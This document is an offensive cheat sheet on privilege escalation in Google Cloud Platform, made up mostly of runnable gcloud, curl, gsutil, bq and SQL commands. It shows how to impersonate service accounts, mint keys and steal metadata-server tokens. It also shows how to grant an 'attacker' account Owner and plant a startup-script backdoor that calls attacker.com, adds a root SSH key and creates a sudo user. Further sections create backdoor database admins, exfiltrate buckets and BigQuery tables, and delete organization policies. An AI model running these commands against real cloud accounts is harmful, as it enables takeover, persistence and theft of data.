# GCP Privilege Escalation

Techniques for escalating privileges within Google Cloud Platform.

## Custom Role Enumeration & Abuse

### Find Weak Custom Roles

```bash
# List all custom roles in project
gcloud iam roles list --project={projectId} --format="json" | jq '.[] | {title, name, includedPermissions}'

# Look for roles with too many permissions
gcloud iam roles describe projects/{projectId}/roles/customEditor --format="json"

# Identify dangerous permission combinations
gcloud iam roles describe projects/{projectId}/roles/cloudSqlAdmin --format="json" | jq '.includedPermissions[]'

# Search for custom roles with wildcard permissions
gcloud iam roles list --project={projectId} --format="json" | \
  jq '.[] | select(.includedPermissions[] | contains("*"))'

# These roles likely grant overly broad access
# Use them if you have assignment permissions
```

### Modify Custom Roles

```bash
# If you have iam.roles.update permission, modify existing roles
gcloud iam roles describe projects/{projectId}/roles/customRole \
  --format="json" > custom-role.json

# Add more permissions
cat custom-role.json | jq '.includedPermissions += ["compute.instances.setServiceAccount", "iam.serviceAccounts.actAs"]' > updated-role.json

# Update the role
gcloud iam roles update projects/{projectId}/roles/customRole \
  --file=updated-role.json

# Now any user with this role has more permissions
# Including you if you're assigned to it
```

## Service Account Impersonation

### Direct Impersonation

```bash
# Check what service accounts exist
gcloud iam service-accounts list --format="json"

# Determine if you can impersonate them
# Permission: iam.serviceAccounts.actAs or iam.serviceAccounts.implicitDelegation

gcloud iam service-accounts get-iam-policy {serviceAccount}@{projectId}.iam.gserviceaccount.com

# If you have actAs permission, impersonate directly
gcloud auth application-default print-access-token --impersonate-service-account={serviceAccount}@{projectId}.iam.gserviceaccount.com

# Use the impersonated account
gcloud config set auth/impersonate_service_account {serviceAccount}@{projectId}.iam.gserviceaccount.com
gcloud compute instances list  # Runs as impersonated account

# Access APIs as the service account
TOKEN=$(gcloud auth application-default print-access-token --impersonate-service-account={target}@{projectId}.iam.gserviceaccount.com)
curl -H "Authorization: Bearer $TOKEN" \
  https://www.googleapis.com/compute/v1/projects/{projectId}/zones/us-central1-a/instances
```

### Service Account Key Generation

```bash
# If you have iam.serviceAccountKeys.create permission
# Generate a new key for a privileged service account

gcloud iam service-accounts keys create key.json \
  --iam-account={targetServiceAccount}@{projectId}.iam.gserviceaccount.com

# Use the key to authenticate
gcloud auth activate-service-account --key-file=key.json

# Now you have full access as that service account
# Even if original account is compromised/deleted
```

## Compute-based Privilege Escalation

### Abuse Attached Service Account

```bash
# Find compute instances with interesting service accounts
gcloud compute instances list --format="json" | jq '.[] | {name, serviceAccounts}'

# If you can SSH/RDP to an instance with elevated service account
# Use instance's metadata service to get its credentials

curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# The instance service account may have permissions you don't have
# Use it to access resources, modify IAM, deploy code, etc.
```

### VM with Editor Role

```bash
# If instance has Editor role, you can:
# - Create/delete any resource
# - Modify IAM policies
# - Exfiltrate data

# From the instance
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token | jq -r '.access_token')

# Create a new service account with Owner role
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  https://iam.googleapis.com/v1/projects/{projectId}/serviceAccounts \
  -d '{"accountId": "attacker", "displayName": "Attacker Account"}'

# Grant it Owner role
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  https://cloudresourcemanager.googleapis.com/v1/projects/{projectId}:setIamPolicy \
  -d '{
    "policy": {
      "bindings": [{
        "role": "roles/owner",
        "members": ["serviceAccount:attacker@{projectId}.iam.gserviceaccount.com"]
      }]
    }
  }'
```

### Startup Script Code Execution

```bash
# If you have compute.instances.setMetadata permission
# You can modify startup scripts

# Get instance metadata
gcloud compute instances describe {instance} --zone={zone} --format="json" > instance.json

# Modify startup script
cat > startup.sh << 'EOF'
#!/bin/bash
# Execute as root
curl -X POST http://attacker.com/callback?hostname=$(hostname)

# Add attacker SSH key
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Create backdoor user
useradd -m -s /bin/bash -G sudo attacker
echo "attacker:password" | chpasswd
EOF

gcloud compute instances add-metadata {instance} \
  --zone={zone} \
  --metadata-from-file startup-script=startup.sh

# Restart instance to execute startup script
gcloud compute instances stop {instance} --zone={zone}
gcloud compute instances start {instance} --zone={zone}
```

## Cloud SQL Privilege Escalation

### Modify Cloud SQL User Privileges

```bash
# If you have cloudsql.instances.connect permission
# You can modify database users and privileges

# Get Cloud SQL instance
gcloud sql instances list

# Check instance users
gcloud sql users list --instance={instance}

# Create backdoor admin user
gcloud sql users create attacker --instance={instance} --password=password

# Grant admin privileges
# Using Cloud SQL client
gcloud sql connect {instance} --user=root

# In SQL shell
ALTER USER 'attacker'@'%' WITH GRANT OPTION;
GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%';
FLUSH PRIVILEGES;

# Access all database data as admin
SELECT * FROM sensitive_database.sensitive_table;
```

### Service Account to Database Escalation

```bash
# Cloud SQL supports service account authentication
# If your service account can connect, it may have limited permissions
# But you can grant yourself higher permissions

# Get Cloud SQL client certificate
gcloud sql instances describe {instance} --format="value(serverCaCert.cert)"

# Generate service account token for Cloud SQL API
TOKEN=$(gcloud auth application-default print-access-token)

# Call Cloud SQL Admin API to modify users
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  https://sqladmin.googleapis.com/sql/v1beta4/projects/{projectId}/instances/{instance}/users \
  -d '{
    "name": "admin",
    "password": "SuperSecret!",
    "type": "BUILT_IN"
  }'
```

## BigQuery Privilege Escalation

### Modify Dataset Permissions

```bash
# If you have bigquery.datasets.update permission
# You can modify who can access datasets

bq ls --project_id={projectId}

# Get dataset access
bq show {dataset}

# Modify dataset to add yourself
bq update \
  --set_iam_policy=policy.json \
  {dataset}

# In policy.json:
# Grant yourself roles/bigquery.admin on the dataset
# Gives you full access to query and modify any table
```

### Query Sensitive Data via Shared Resources

```bash
# Find shared BigQuery datasets
bq ls --project_id={sharedProject}

# If you're granted access to a dataset with sensitive data
bq query --nouse_legacy_sql \
  'SELECT * FROM `{project}.{dataset}.{table}`'

# Export data
bq extract {dataset}.{table} gs://{bucket}/{output}.csv

# If you have permissions, create a new service account
# With BigQuery Editor role
# Then use that account for large-scale data access
```

## Cloud Storage Lifecycle Escalation

### Modify Bucket Lifecycle & Access

```bash
# If you have storage.buckets.update permission
# You can modify bucket policies and lifecycle

gsutil iam get gs://{bucket}

# Create policy granting access to your attacker account
gsutil iam ch serviceAccount:{attacker}@{projectId}.iam.gserviceaccount.com:roles/storage.admin gs://{bucket}

# Now the attacker account can access the bucket
# Download all objects
gsutil -m cp -r gs://{bucket}/* .
```

### Abuse CSEK (Customer-Supplied Encryption Keys)

```bash
# If you find CSEK references in bucket configuration
# You might be able to bypass encryption

gsutil encryption get gs://{bucket}

# If CSEK is in use, you need the key to read objects
# But if you have buckets.get permission, you might find CSEK in metadata

# Check if CSEK is stored in insecure locations
gcloud secrets list

# If you find CSEK in Secret Manager and have secretmanager.secrets.get permission
gcloud secrets versions access latest --secret=bucket-csek-key

# Use CSEK to decrypt objects
gsutil -h "x-goog-encryption-key:{KEY}" cp gs://{bucket}/encrypted-file local-file
```

## Organization Policy Bypass

### Exploit Weak Organization Constraints

```bash
# List organization policies
gcloud resource-manager org-policies list --project={projectId}

# Some policies can be disabled by organizational admins
# Or bypassed if you have resourcemanager.organizationPolicies.setPolicy

# Check policy details
gcloud resource-manager org-policies describe \
  --project={projectId} \
  constraints/compute.requireShieldedVm

# Disable the policy (if you have permissions)
gcloud resource-manager org-policies delete \
  --project={projectId} \
  constraints/compute.requireShieldedVm

# Now you can create unshielded VMs
gcloud compute instances create attacker-vm --no-shielded-secure-boot
```

## API-based Escalation

### Enable Dangerous APIs

```bash
# If you have servicemanagement.admin permission
# You can enable any GCP API

# Current enabled APIs
gcloud services list --enabled

# Enable Cloud SQL Admin (if not already)
gcloud services enable sqladmin.googleapis.com

# Enable Compute Engine (for VM access)
gcloud services enable compute.googleapis.com

# Enable IAM API (for user management)
gcloud services enable iam.googleapis.com

# Once APIs are enabled, use them for exploitation
# Create resources, modify permissions, etc.
```

### Service Account Service Management

```bash
# Service accounts can perform service management
# Enabling APIs and modifying service access

# Check service account permissions
gcloud projects get-iam-policy {projectId} \
  --flatten="bindings[].members" \
  --filter="bindings.members:serviceAccount:{target}"

# If servicemanagement.services.create permission exists
# Create your own custom services with elevated permissions
```

## Cross-Project Escalation

### Find Service Accounts in Other Projects

```bash
# Some service accounts have cross-project access
# Organization level permissions

# List service accounts in current project
gcloud iam service-accounts list

# Check if any have Organization-level roles
# Requires Organization viewer access

# If you find organization-level service account
# Impersonate it for organization-wide access
gcloud auth activate-service-account --key-file=org-service-account.json

# Now you have access to all projects in the organization
gcloud projects list
```

### Shared VPC Exploitation

```bash
# Shared VPC allows projects to use shared network
# Service accounts in one project can access resources in others

gcloud compute networks list --global

# Check which projects share the network
gcloud compute networks peerings list

# If you have access to shared network, you can:
# - Access instances in other projects on the network
# - Intercept traffic
# - Pivot to other projects
```
